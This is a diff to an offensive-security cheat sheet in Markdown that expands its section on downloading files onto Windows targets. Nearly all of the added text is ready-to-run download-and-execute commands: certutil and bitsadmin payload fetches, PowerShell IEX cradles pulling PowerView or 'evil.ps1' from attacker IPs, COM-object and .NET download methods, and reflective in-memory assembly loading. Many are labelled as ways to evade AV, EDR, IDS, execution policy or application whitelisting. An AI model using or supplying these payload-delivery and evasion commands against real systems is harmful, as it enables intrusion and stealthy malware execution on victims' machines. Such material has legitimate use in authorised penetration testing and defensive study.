@@ -206,33 +206,103 @@
 > *Decode online at:* [CyberChef](https://gchq.github.io/CyberChef)
 
 ---
+## Download Files with script
 
-## File Download Techniques
-
-> [!tip]+ Downloading Files (File Transfer)
-> Various methods to download files from a remote server.
+> [!tip]+ Downloading Files to the Filesystem
+> These methods save the file directly to the hard drive. Easier to use, but more likely to be caught by AV.
 > 
-> **Certutil:**
+> **Certutil (CMD):**
 > ```cmd
 > certutil -urlcache -f http://192.158.23.1/payload.exe payload.exe
 > ```
-> **PowerShell WebClient:**
-> ```powershell
-> (New-Object System.Net.WebClient).DownloadFile('http://file.exe','file.exe')
-> # Or execute directly in memory:
-> IEX(New-Object System.Net.WebClient).DownloadString("https://powercatlink.ps1")
-> ```
-> **Invoke-WebRequest (iwr):**
-> ```powershell
-> iwr -uri http://172.20.10.1/file.exe -Outfile winPEAS.exe
-> ```
-> **Bitsadmin (Bypass IDS/IPS):**
+> 
+> **Bitsadmin (Bypass IDS/IPS - Slow but stealthy):**
 > ```cmd
 > bitsadmin /transfer exploit.exe http://1p/exploit.exe C:\service.exe
 > ```
+> 
+> **Invoke-WebRequest (PowerShell):**
+> ```powershell
+> iwr -uri http://172.20.10.1/file.exe -Outfile winPEAS.exe
+> ```
+> 
+> **Start-BitsTransfer (PowerShell version of Bitsadmin):**
+> ```powershell
+> Start-BitsTransfer -Source "http://172.20.10.1/file.exe" -Destination "C:\Windows\Temp\file.exe"
+> ```
+#### In-Memory Execution (Fileless)
 
----
+> [!danger]+ Downloading & Executing Scripts in Memory
+> Using `IEX` (Invoke-Expression) allows scripts to be downloaded and executed directly in RAM without touching the disk.
+> 
+> **Method 1: Net.WebClient (DownloadString)**
+> ```powershell
+> IEX (New-Object Net.WebClient).DownloadString('https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1')
+> ```
+> **Method 2: Invoke-WebRequest (iwr)**
+> ```powershell
+> IEX (iwr 'http://x.x.x.x/s.ps1')
+> # Or explicitly:
+> IEX (Invoke-WebRequest -Uri 'http://x.x.x.x/s.ps1' -UseBasicParsing).Content
+> ```
 
+> [!bug]+ Using COM Objects for Stealthy Downloads
+> Component Object Model (COM) objects can be used to bypass PowerShell execution policies and certain application whitelisting solutions.
+> 
+> **Method 1: InternetExplorer.Application (CLSID)**
+> *Note: Requires Internet Explorer engine to be available.*
+> ```powershell
+> $ie = New-Object -ComObject InternetExplorer.Application
+> $ie.Visible = $False
+> $ie.navigate('https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1')
+> sleep 5
+> $response = $ie.Document.body.innerHTML
+> $ie.quit()
+> IEX $response
+> ```
+> 
+> **Method 2: Msxml2.XMLHTTP**
+> *Reads the context of a web page via XMLHTTP requests.*
+> ```powershell
+> $h = New-Object -ComObject Msxml2.XMLHTTP
+> $h.open('GET','http://x.x.x.x/evil.ps1',$false)
+> $h.send()
+> IEX $h.ResponseText
+> ```
+> 
+> **Method 3: WinHttp.WinHttpRequest.5.1 (Added)**
+> *Often used when Msxml2 is monitored by EDR.*
+> ```powershell
+> $w = New-Object -ComObject WinHttp.WinHttpRequest.5.1
+> $w.Open('GET','http://x.x.x.x/evil.ps1',$false)
+> $w.Send()
+> IEX $w.ResponseText
+> ```
+
+> [!example]+ Using .NET Framework for Downloads
+> If Constrained Language Mode (CLM) or Proxies block standard Cmdlets like `iwr`, .NET classes can be invoked directly.
+> 
+> **Method 1: System.Net.WebRequest**
+> ```powershell
+> $wr = [System.NET.WebRequest]::Create("http://x.x.x.x/evil.ps1")
+> $r = $wr.GetResponse()
+> IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()
+> ```
+> 
+> **Method 2: System.Net.WebClient (DownloadFile - Added)**
+> *Saves a file to disk using .NET.*
+> ```powershell
+> (New-Object System.Net.WebClient).DownloadFile('http://x.x.x.x/file.exe','C:\Users\Public\file.exe')
+> ```
+> 
+> **Method 3: System.Net.WebClient (DownloadData - Added)**
+> *Downloads file as a byte array (useful for invoking .NET assemblies in memory).*
+> ```powershell
+> $bytes = (New-Object System.Net.WebClient).DownloadData('http://x.x.x.x/payload.exe')
+> # Example execution in memory:
+> [Reflection.Assembly]::Load($bytes) | Out-Null
+> [Program]::Main()
+> ```
 ## Registry & Persistence
 
 > [!abstract]+ Registry Navigation
